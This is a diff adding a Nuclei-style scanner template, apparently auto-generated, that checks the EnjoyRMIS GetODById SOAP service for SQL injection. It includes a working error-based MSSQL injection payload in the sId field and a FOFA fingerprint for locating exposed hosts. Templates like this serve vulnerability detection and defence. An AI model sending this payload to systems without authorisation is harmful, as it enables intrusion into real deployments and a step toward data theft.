@@ -1,0 +1,52 @@
+id: poc-yaml-enjoyrmis-getodbyid-sqli
+info:
+  name: EnjoyRMIS GetODById SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: enjoyrmis
+    fofa: body="CheckSilverlightInstalled"
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+http:
+  - raw:
+      - |
+        POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetODById"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetODById xmlns="http://tempuri.org/">
+              <sId>string' AND 1234 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')))) AND 'uXof'='uXof</sId>
+            </GetODById>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "soap:Server"
+          - "在将"
+          - "转换成数据类型"
+        part: body
+      - type: word
+        words:
+          - "0x{{t2}}"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "0x[0-9a-fA-F]{32}"
